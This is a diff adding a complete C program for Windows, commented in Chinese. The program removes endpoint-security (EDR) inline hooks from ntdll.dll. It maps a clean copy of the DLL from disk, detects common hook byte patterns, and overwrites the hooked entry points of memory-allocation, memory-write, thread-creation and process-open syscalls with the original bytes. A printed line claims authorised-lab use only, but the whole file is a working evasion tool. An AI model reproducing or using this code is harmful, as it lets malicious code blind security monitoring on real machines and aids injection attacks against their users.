@@ -1,0 +1,128 @@
+#include <Windows.h>
+#include <stdio.h>
+
+// 从磁盘加载干净的 ntdll.dll (SEC_IMAGE 保证内存布局一致)
+PVOID GetCleanNtdllImage()
+{
+    HANDLE hFile = CreateFileA(
+        "C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return NULL;
+
+    HANDLE hMap = CreateFileMappingA(
+        hFile,
+        NULL,
+        PAGE_READONLY | SEC_IMAGE,
+        0,
+        0,
+        NULL
+    );
+
+    PVOID pMap = NULL;
+    if (hMap)
+    {
+        pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+        CloseHandle(hMap);
+    }
+
+    CloseHandle(hFile);
+    return pMap;
+}
+
+// 识别常见 EDR inline hook 类型并返回钩子长度
+int DetectHookLength(PVOID pFunc)
+{
+    BYTE* code = (BYTE*)pFunc;
+
+    // 1. 5字节 JMP (E9 xx xx xx xx)
+    if (code[0] == 0xE9)
+        return 5;
+
+    // 2. 14字节: mov rax, addr + jmp rax
+    if (code[0] == 0x48 && code[1] == 0xB8 &&
+        code[10] == 0xFF && code[11] == 0xE0)
+        return 14;
+
+    // 3. 短跳 EB xx
+    if (code[0] == 0xEB)
+        return 2;
+
+    // 无明显钩子
+    return 0;
+}
+
+// 恢复单个函数
+BOOL RestoreFunction(const char* funcName)
+{
+    HMODULE hNtdllMem = GetModuleHandleA("ntdll.dll");
+    PVOID pFuncMem = GetProcAddress(hNtdllMem, funcName);
+    if (!pFuncMem) return FALSE;
+
+    int hookLen = DetectHookLength(pFuncMem);
+    if (hookLen == 0)
+    {
+        printf("[*] %s 未检测到钩子\n", funcName);
+        return TRUE;
+    }
+
+    printf("[+] %s 检测到钩子，长度: %d 字节\n", funcName, hookLen);
+
+    // 加载干净 ntdll
+    PVOID pCleanNtdll = GetCleanNtdllImage();
+    if (!pCleanNtdll) return FALSE;
+
+    PVOID pFuncClean = GetProcAddress((HMODULE)pCleanNtdll, funcName);
+    if (!pFuncClean)
+    {
+        UnmapViewOfFile(pCleanNtdll);
+        return FALSE;
+    }
+
+    // 修改内存可写
+    DWORD oldProtect;
+    if (!VirtualProtect(pFuncMem, hookLen, PAGE_EXECUTE_READWRITE, &oldProtect))
+    {
+        UnmapViewOfFile(pCleanNtdll);
+        return FALSE;
+    }
+
+    // 覆盖恢复（研究用途）
+    memcpy(pFuncMem, pFuncClean, hookLen);
+    VirtualProtect(pFuncMem, hookLen, oldProtect, &oldProtect);
+
+    UnmapViewOfFile(pCleanNtdll);
+    printf("[+] %s 已恢复原始入口\n", funcName);
+    return TRUE;
+}
+
+int main()
+{
+    printf("=== EDR Hook 研究演示：恢复 ntdll 函数 ===\n");
+    printf("本代码仅用于授权实验室研究\n\n");
+
+    // 常见被挂钩的函数
+    const char* targets[] = {
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtCreateThreadEx",
+        "NtOpenProcess",
+        NULL
+    };
+
+    for (int i = 0; targets[i]; i++)
+    {
+        RestoreFunction(targets[i]);
+    }
+
+    printf("\n[*] 演示完成\n");
+    system("pause");
+    return 0;
+}
